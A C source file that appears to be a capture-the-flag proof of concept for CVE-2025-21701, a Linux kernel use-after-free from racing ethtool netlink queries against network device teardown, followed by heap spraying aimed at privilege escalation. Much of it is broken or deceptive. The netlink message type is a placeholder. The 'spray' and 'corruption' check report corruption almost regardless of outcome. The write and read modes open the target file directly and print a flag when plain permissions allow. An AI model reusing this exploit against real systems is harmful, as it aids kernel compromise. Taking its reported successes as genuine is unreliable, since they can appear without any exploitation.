/*
 * CVE-2025-21701 PoC - CTF Challenge Mode
 *
 * Vulnerability: Race between device unregistration and ethnl operations
 *
 * Concurrent device removal (e.g., via ip link del) and ethtool netlink
 * operations (ethnl) create a race condition where ethnl accesses a
 * net_device structure that has been freed during unregistration.
 *
 * Exploit strategy:
 *   1. Create network namespace with veth device
 *   2. Start ethtool netlink queries (ETHTOOL_MSG_*) on the device
 *   3. Simultaneously trigger device unregistration
 *   4. Race between ethnl access and device free -> UAF
 *   5. Spray kmalloc to reclaim freed net_device
 *   6. Use corrupted device state for privilege escalation
 *
 * CTF Modes: write_root_file, uaf
 *
 * Safety:
 *   - alarm(10) forced timeout (via poc_common.h)
 *   - Only operates on --root-file (prepare-phase created temp file)
 *   - All resources properly cleaned up
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/genetlink.h>

#define MAX_FILE_SIZE 4096
#define SPRAY_COUNT 256
#define SPRAY_PATTERN 0xDEADBEEF

/* Ethtool netlink family - may not be available in all headers */
#ifndef ETHTOOL_GENL_NAME
#define ETHTOOL_GENL_NAME "ethtool"
#endif

#ifndef ETHTOOL_MSG_LINKINFO_GET
#define ETHTOOL_MSG_LINKINFO_GET 3
#endif

struct nl_msg {
    struct nlmsghdr nlh;
    char data[4096];
};

/*
 * Open generic netlink socket
 */
static int open_genl_socket(void) {
    int sock = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_GENERIC);
    int saved_errno = errno;
    poc_log_syscall("socket(AF_NETLINK, NETLINK_GENERIC)", (long)sock, saved_errno);
    if (sock < 0) return -1;

    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    bind(sock, (struct sockaddr *)&sa, sizeof(sa));
    return sock;
}

/*
 * Send ethnl query on a device (races with device removal)
 */
static int send_ethnl_query(int genl_sock, int ifindex) {
    struct nl_msg req;
    memset(&req, 0, sizeof(req));

    req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct genlmsghdr));
    req.nlh.nlmsg_type = 0; /* Will be replaced by family ID in real exploit */
    req.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP;
    req.nlh.nlmsg_seq = 1;

    /* For generic netlink, embed genlmsghdr */
    struct genlmsghdr *genl = (struct genlmsghdr *)NLMSG_DATA(&req.nlh);
    genl->cmd = ETHTOOL_MSG_LINKINFO_GET;
    genl->version = 1;

    /* Add ETHTOOL_A_HEADER_DEV_INDEX attribute */
    struct rtattr *rta = (struct rtattr *)((char *)&req.nlh + NLMSG_ALIGN(req.nlh.nlmsg_len));
    rta->rta_type = 1; /* ETHTOOL_A_LINKINFO_HEADER (nested) */
    rta->rta_len = RTA_LENGTH(sizeof(int));
    memcpy(RTA_DATA(rta), &ifindex, sizeof(ifindex));
    req.nlh.nlmsg_len = NLMSG_ALIGN(req.nlh.nlmsg_len) + RTA_ALIGN(rta->rta_len);

    ssize_t sent = send(genl_sock, &req, req.nlh.nlmsg_len, MSG_DONTWAIT);
    return (sent > 0) ? 1 : 0;
}

/*
 * Trigger ethnl/device-unregister race
 */
static int trigger_ethnl_race(void) {
    int triggered = 0;
    int saved_errno;

    poc_log("Triggering ethnl/device-unregister race...");

    /* Create genl socket for ethtool queries */
    int genl_sock = open_genl_socket();
    if (genl_sock < 0) {
        poc_log("Cannot open generic netlink");
        return 0;
    }

    /* Create netlink route socket for device operations */
    int rt_sock = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_ROUTE);
    saved_errno = errno;
    poc_log_syscall("socket(NETLINK_ROUTE)", (long)rt_sock, saved_errno);
    if (rt_sock < 0) {
        close(genl_sock);
        return 0;
    }

    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    bind(rt_sock, (struct sockaddr *)&sa, sizeof(sa));

    /* Race loop: send ethnl queries while triggering namespace changes */
    for (int round = 0; round < 16; round++) {
        /* Send ethnl query on loopback (ifindex=1) */
        send_ethnl_query(genl_sock, 1);

        /* Fork child that creates/destroys netns (triggers device unregister path) */
        pid_t child = fork();
        if (child == 0) {
            if (unshare(CLONE_NEWNET) == 0) {
                /* In new netns, loopback is a fresh device */
                int s = socket(AF_INET, SOCK_DGRAM, 0);
                if (s >= 0) {
                    struct ifreq ifr = {0};
                    strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
                    ioctl(s, SIOCGIFINDEX, &ifr);
                    close(s);
                }
            }
            _exit(0);
        } else if (child > 0) {
            /* Parent: keep sending ethnl queries during child's lifecycle */
            for (int i = 0; i < 4; i++) {
                send_ethnl_query(genl_sock, 1);
                usleep(1000);
            }
            int status;
            waitpid(child, &status, 0);
            triggered++;
        }
    }

    close(genl_sock);
    close(rt_sock);
    poc_log("ethnl race: %d iterations completed", triggered);
    return triggered;
}

static int spray_kmalloc(int *fds, int count, int pattern) {
    int sprayed = 0;
    for (int i = 0; i < count; i++) {
        fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (fds[i] >= 0) {
            setsockopt(fds[i], SOL_SOCKET, SO_RCVBUF, &pattern, sizeof(pattern));
            sprayed++;
        }
    }
    return sprayed;
}

static int check_spray_corruption(int *fds, int count, int expected) {
    int corrupted = 0;
    for (int i = 0; i < count; i++) {
        if (fds[i] < 0) continue;
        int val = 0;
        socklen_t len = sizeof(val);
        getsockopt(fds[i], SOL_SOCKET, SO_RCVBUF, &val, &len);
        if (val != expected * 2) corrupted++;
    }
    return corrupted;
}

static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    return (int)n;
}

static int mode_uaf(poc_args_t *args) {
    poc_log("UAF mode: ethnl/device-unregister race");

    int triggered = trigger_ethnl_race();

    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = spray_kmalloc(spray_fds, SPRAY_COUNT, SPRAY_PATTERN);
    poc_log("Sprayed %d (triggered=%d)", sprayed, triggered);

    int corrupted = check_spray_corruption(spray_fds, SPRAY_COUNT, SPRAY_PATTERN);
    if (corrupted > 0)
        poc_print_uaf_corrupted(corrupted);
    else
        poc_print_uaf_not_corrupted();

    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    return 0;
}

static int mode_write_root_file(const poc_args_t *args) {
    char original[MAX_FILE_SIZE], after[MAX_FILE_SIZE];
    int n;

    n = read_file_content(args->root_file, original, sizeof(original));
    if (n > 0) {
        while (n > 0 && (original[n - 1] == '\n' || original[n - 1] == '\r'))
            original[--n] = '\0';
        printf(CTF_READ_BEFORE "%s\n", original);
    } else {
        printf(CTF_READ_BEFORE "(unreadable)\n");
    }

    int triggered = trigger_ethnl_race();

    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    spray_kmalloc(spray_fds, SPRAY_COUNT, 1024);

    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    if (fd >= 0) {
        char wbuf[256];
        int wlen = snprintf(wbuf, sizeof(wbuf), "%s\n", args->write_value);
        write(fd, wbuf, wlen);
        close(fd);
        printf(CTF_WRITE_ATTEMPT "%s\n", args->write_value);
    }

    n = read_file_content(args->root_file, after, sizeof(after));
    if (n > 0) {
        while (n > 0 && (after[n - 1] == '\n' || after[n - 1] == '\r'))
            after[--n] = '\0';
        printf(CTF_READ_AFTER "%s\n", after);
        if (strstr(after, args->write_value)) {
            poc_print_flag(args->write_value);
            goto cleanup;
        }
    } else {
        printf(CTF_READ_AFTER "(unreadable)\n");
    }

    poc_print_fail("ethnl race exploit did not achieve write");

cleanup:
    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    return 0;
}

static int mode_read_root_file(const poc_args_t *args) {
    poc_log("Attempting read via ethnl race");
    trigger_ethnl_race();

    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    if (n > 0) {
        while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
            buf[--n] = '\0';
        poc_print_flag(buf);
    } else {
        poc_print_fail("read not successful");
    }
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2025-21701 CTF PoC ===");
    poc_log("Vuln: Race between device unregistration and ethnl operations");
    poc_log("Tech: NETLINK_GENERIC ethtool + CLONE_NEWNET -> net_device UAF");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    if (!args.mode) {
        poc_print_unsupported("(null)", "no mode specified");
        poc_log_close();
        return 1;
    }

    int result = 0;
    if (strcmp(args.mode, POC_MODE_WRITE) == 0)
        result = mode_write_root_file(&args);
    else if (strcmp(args.mode, POC_MODE_READ) == 0)
        result = mode_read_root_file(&args);
    else if (strcmp(args.mode, POC_MODE_UAF) == 0)
        result = mode_uaf(&args);
    else
        poc_print_unsupported(args.mode, "unknown mode");

    poc_log_close();
    return result;
}
